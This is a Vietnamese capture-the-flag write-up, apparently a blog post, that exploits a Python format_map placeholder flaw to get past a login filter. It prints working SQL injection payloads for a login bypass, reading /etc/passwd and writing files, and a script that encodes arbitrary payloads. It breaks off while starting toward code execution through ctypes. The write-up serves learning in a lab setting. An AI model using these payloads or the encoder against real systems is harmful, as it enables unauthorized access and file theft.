
Đây thật sự là một challenge mà mình thích nhất trong đợt training :)) Không chỉ vì exploit chain hay giúp mình vận dụng được nhiều kĩ năng mà giao diện web cũng gợi mình khá nhiều liên tưởng😄

![[Attachments/Pasted image 20261118215845.png]]

# TL;DR

Mình giải challenge này bằng cách kết hợp nhiều lỗ hỏng khác nhau, mỗi lỗ hỏng lại mở ra nhiều điều thú vị để mình khám phá. Bắt đầu từ 
**Business Logic Flaws -> SQL injection + Python Format String Gadget -> Arbitrary file write/read  -> Remote Code Execution 😳** 

# 1. Reconnaissance!!

Mình thử spawn Instance mà recon qua thì dường như challenge chỉ có một chức năng duy nhất là đăng nhập:
Nếu đăng nhập sai thì sẽ trả về 'Invalid Credentials':
![[Attachments/Pasted image 20261118222452.png]]

Nếu có kí tự lạ thì sẽ trả về thông báo cấm:
![[Attachments/Pasted image 20261118222649.png]]

Mình xem đến source code:
Đầu tiên là **Dockerfile**, mình thấy các setup thông thường, flag được để ở /root/flag.txt, quyền 400 nên chỉ root được đọc:
![[Attachments/Pasted image 20261118222917.png]]

Chuyển sang **start.sh**:
![[Attachments/Pasted image 20261118224117.png]]

Logic của app được thể hiện trong **app.py**:
![[Attachments/2026-11-18_22-46.png]]


Ta thấy sự xuất hiện của class SQLQueryBuilder và InputValidator trong hàm authenticate:
![[Attachments/Pasted image 20261118231027.png]]


Hàm InputValidate lưu cặp placeholder và giá trị tương ứng cùng với logic kiểm tra xem có thỏa mãn các yêu cầu bảo mật không, đáng chú ý là một lúc sau mình mới để ý có một typo nho nhỏ ở danh sách các kí tự cấm 😋
![[Attachments/Pasted image 20261118231634.png]]

Đến với SQLQueryBuilder, đây mới là phần thú vị nhất:
![[Attachments/Pasted image 20261118231844.png]]

Điểm thú vị nằm ở vòng lặp While:
![[Attachments/Pasted image 20261118232041.png]]

Logic nhìn qua có thể thấy khá bình thường. Nhưng đọc kĩ chúng ta có thể thấy một điều rất bất thường.
Bình thường nếu một dev bình thường muốn code để thay thế từ:

```
"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

thành

```
"SELECT * FROM users WHERE username = '<user input>' AND password = '<user input>'"
```

thì chỉ cần đơn giản là dùng *Prepared Statement* cho an toàn và đơn giản;
hoặc nếu muốn đổi gió có thể dùng các hàm replace có sẵn hay là chạy vòng lặp từ đầu đến cuối tìm xem chỗ nào có dạng { ... } thì thay giá trị vào (đương nhiên phải validate kĩ input của user )

Điều bất thường ở đây là ứng dụng đang chạy một vòng lặp While để kiểm tra liên tục xem còn chỗ nào có { ... } không thì cứ tiếp tục thay vào:

```python
    def build_query(self):
        """Build the final SQL query by replacing placeholders."""
        query = self.template
        self.placeholders = self.extract_placeholders(query)
        
        while self.placeholders:
            current_key = self.placeholders[0]
            replacement_map = dict.fromkeys(
                self.placeholders, 
                lambda _, key: f"{{{key}}}"
            )
            
            for placeholder_key in self.placeholders:
                if placeholder_key in self.validators:
                    if current_key == placeholder_key:
                        replacement_map[placeholder_key] = self.validators[placeholder_key].get_validated_value()
                else:
                    replacement_map[placeholder_key] = InputValidator
                    
            query = query.format_map(
                type('FormatDict', (), {
                    '__getitem__': lambda _, key: (
                        replacement_map[key] if isinstance(replacement_map[key], str) 
                        else replacement_map[key]("", key)
                    )
                })()
            )
            
            self.placeholders = self.extract_placeholders(query)
            
```

Để cho các bạn dễ hình dung thì giả sử mình nhập vào form đăng nhập một cách dị dị như kiểu:

username :  {abcdxyz}
password:  {spamspamspam}

Thì từ:
```
"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

Ứng dụng sẽ chạy vòng While và thay thế thành:
```
"SELECT * FROM users WHERE username = '{abcdxyz}' AND password = '{spamspamspam}'"
```

Sau đó, khi thấy vẫn còn placeholder dạng { ... } thì lại chạy tiếp vòng lặp và do không có value tương ứng nên sẽ gán thành rỗng và query trở thành:
![[Attachments/Pasted image 20261118233521.png|700]]

Thật ra cái này trông có vẻ vô hại thật, vì chúng ta chưa thể kiểm soát được giá trị sẽ thay thế tương ứng,... hoặc là... có thể!?

Nhìn lại Logic vòng While một chút, trong đoạn này:
```python
for placeholder_key in self.placeholders:
                if placeholder_key in self.validators:
                    if current_key == placeholder_key:
                        replacement_map[placeholder_key] = self.validators[placeholder_key].get_validated_value()
                else:
                    replacement_map[placeholder_key] = InputValidator
                    
            query = query.format_map(
                type('FormatDict', (), {
                    '__getitem__': lambda _, key: (
                        replacement_map[key] if isinstance(replacement_map[key], str) 
                        else replacement_map[key]("", key)
                    )
                })()
            )
            
            self.placeholders = self.extract_placeholders(query)
```

Logic của nó kiểu:
*Nếu có key nào đầu vào trùng với placeholder đang có trong query => Thay giá trị ứng với key đó vào*

*Nếu không =>  Gán value ứng với key đó thành object InputValidator !?*

*Với map vừa tạo được dùng str.format_map() để thay thế*

Tìm hiểu thêm về str.format_map(), ta thấy nó có cơ chế tương tự với str.format():
Bạn đọc thêm ở: https://www.programiz.com/python-programming/methods/string/format_map
![[Attachments/Pasted image 20261118234707.png]]
![[Attachments/Pasted image 20261118234815.png]]

Tìm hiểu về str.format() ta có thể thấy hàm này có một vài tính năng rất thú vị và đáng để tìm hiểu:
Bạn đọc thêm tại: https://docs.python.org/3/library/string.html

![[Attachments/Pasted image 20261118235152.png]]

Nhìn thì phức tạp nhưng bạn có thể xem phần ví dụ bên dưới:
![[Attachments/Pasted image 20261118235232.png]]

Bạn có thể thấy, thật tuyệt vời khi chúng ta có thể làm một vài điều khá thù vị như kiểu truy cập attribute, gọi các hàm str(), repr(),.. của object.

Điều này không khác gì mỏ vàng vì kết hợp với phân tích ở trước, chúng ta có thể bypass hoàn toàn bộ lọc bằng cách dùng chính list **FORBIDDEN_CHARACTERS** trong class **Input Validator** để bypass và chèn được kí tự bị cấm vào query của mình, và có được lỗ hỏng đầu tiên - ***SQL injection***:

**Payload:**
username : admin
password : `
`{a}{a.FORBIDDEN_CHARACTERS[5]}{a.FORBIDDEN_CHARACTERS[3]}OR{a.FORBIDDEN_CHARACTERS[3]}1=1{a.FORBIDDEN_CHARACTERS[3]}{a.FORBIDDEN_CHARACTERS[10]}{a.FORBIDDEN_CHARACTERS[10]}{a.FORBIDDEN_CHARACTERS[3]}{a.FORBIDDEN_CHARACTERS[10]}`

(Sau khi vòng While chạy xong thì password sẽ thành` ' OR 1=1 -- -`)

![[Attachments/Pasted image 20261119000522.png]]

Tuyệt vời!!! Mình đã đăng nhập được với tài khoản admin mặc dù vào thì chỉ hiện ra trang 404 nhưng cũng đã giúp mình xác nhận được SQL injection !!

Một script đơn giản để bạn có thể tự tạo payload bất kì cho riêng mình:
```python
FORBIDDEN = [
    '"', '(', ')', ' ', ',', "'",
    '\\', '/', '*', '+%', '-', ';', '#'
]

def bypass(payload, key="a"):
    result = ""

    for char in payload:
        if char in FORBIDDEN:
            index = FORBIDDEN.index(char)
            result += f"{{{key}.FORBIDDEN_CHARACTERS[{index}]}}"
        else:
            result += char

    return f"{{{key}}}" + result


if __name__ == "__main__":
    while True:
        payload = input("Nhap payload ban can bypass!!!! =>  ")
        print(bypass(payload))
        print("="*10)
        print("\n")

```


Oke, giờ đã có SQL injection, trên lý thuyết chúng ta có thể đọc toàn bộ Database rồi, nhưng dường như Database của app không có gì ngoài account admin:))
![[Attachments/Pasted image 20261119001428.png]]

Lúc này nhìn vào source code ta còn thấy App còn in thẳng lỗi database nếu query bị lỗi:
```python
        except mysql.connector.Error as database_error:
            flash(f"Database query failed: {database_error}", 'error')
```

Không còn gì tuyệt vời hơn khi chúng ta có thể tận dụng Error-based SQL injection và đọc mọi file mình muốn:

**Payload:**
username : admin
password : 
```
{a}x{a.FORBIDDEN_CHARACTERS[5]}{a.FORBIDDEN_CHARACTERS[3]}UNION{a.FORBIDDEN_CHARACTERS[3]}SELECT{a.FORBIDDEN_CHARACTERS[3]}1{a.FORBIDDEN_CHARACTERS[4]}EXTRACTVALUE{a.FORBIDDEN_CHARACTERS[1]}1{a.FORBIDDEN_CHARACTERS[4]}CONCAT{a.FORBIDDEN_CHARACTERS[1]}0x7e{a.FORBIDDEN_CHARACTERS[4]}LOAD_FILE{a.FORBIDDEN_CHARACTERS[1]}{a.FORBIDDEN_CHARACTERS[5]}{a.FORBIDDEN_CHARACTERS[7]}etc{a.FORBIDDEN_CHARACTERS[7]}passwd{a.FORBIDDEN_CHARACTERS[5]}{a.FORBIDDEN_CHARACTERS[2]}{a.FORBIDDEN_CHARACTERS[4]}0x7e{a.FORBIDDEN_CHARACTERS[2]}{a.FORBIDDEN_CHARACTERS[2]}{a.FORBIDDEN_CHARACTERS[4]}3{a.FORBIDDEN_CHARACTERS[10]}{a.FORBIDDEN_CHARACTERS[10]}{a.FORBIDDEN_CHARACTERS[3]}{a.FORBIDDEN_CHARACTERS[10]}
```
(Dịch ra: x' UNION SELECT 1,EXTRACTVALUE(1,CONCAT(0x7e,LOAD_FILE('/etc/passwd'),0x7e)),3-- -)


![[Attachments/Pasted image 20261119002042.png]]

Ồ, vậy là có đọc file rồi, giờ thì mình thử viết file xem sao nhỉ?
**Payload:**
username : admin
password : 
```
x' AND 1=0 UNION SELECT 'Hello World!!!','','' INTO DUMPFILE '/var/run/mysqld/hehe.txt'-- -
```

Sau đó thử đọc file:
```
x' UNION SELECT 1,EXTRACTVALUE(1,CONCAT(0x7e,LOAD_FILE('/var/run/mysqld/hehe.txt'),0x7e)),3-- -
```
![[Attachments/Pasted image 20261119002717.png]]

Quá đã!!! Càng ngày càng gần với Flag rồi!!

Vấn đề đặt ra bây giờ là flag đang được giấu tên file nên mình không thể nào đọc được flag mà không có RCE được (hoặc là do mình chưa nghĩ ra cách nào khác) nên giờ lại phải tìm cách nâng lên RCE 😭

Lúc này nhiều bạn có thể nghĩ đến việc chỉ đơn giản là vẫn dựa vào cái cách bypass lúc nãy để có thể 'leo' để có được lên các hàm nguy hiểm để thực thi mã độc như ý tưởng đã có giống SSTI bằng các payload cực kì sáng tạo kiểu: 
```
username : {password.__init__.__globals__[os].popen('cat /flag_*').read()}
password : abc
```
đúng không? Mình cũng nghĩ vậy... Nhưng mình thử thì không thấy gì được in ra terminal của server và không cả có log Executing query.... không hiểu vì sao :))

Nhưng mình biết vì sao command trên không chạy được: do format_map(), chỉ lấy giá trị trả về, không bao giờ execute, bạn có thể thử như sau sẽ thấy trong trường hợp này sau khi format sẽ trả về một object:


(Để hiểu hơn về payload trên bạn có thể đọc tại: https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html)

Lúc này nhờ AI thì mình mới nhận ra một điểm là ở phần chèn thư viện có 2 thư viện chèn mà không được dùng tí nào:
![[Attachments/Pasted image 20261119003635.png]]

Trong đó có cái ctypes cực kì đáng nghi :)) ngay phần cảnh báo trên đầu của doc cũng nói luôn:
Bạn đọc thêm tại: https://docs.python.org/3/library/ctypes.html
![[Attachments/Pasted image 20261119003737.png]]


Trong thư viện này có một hàm cho phép load một shared library tùy ý vào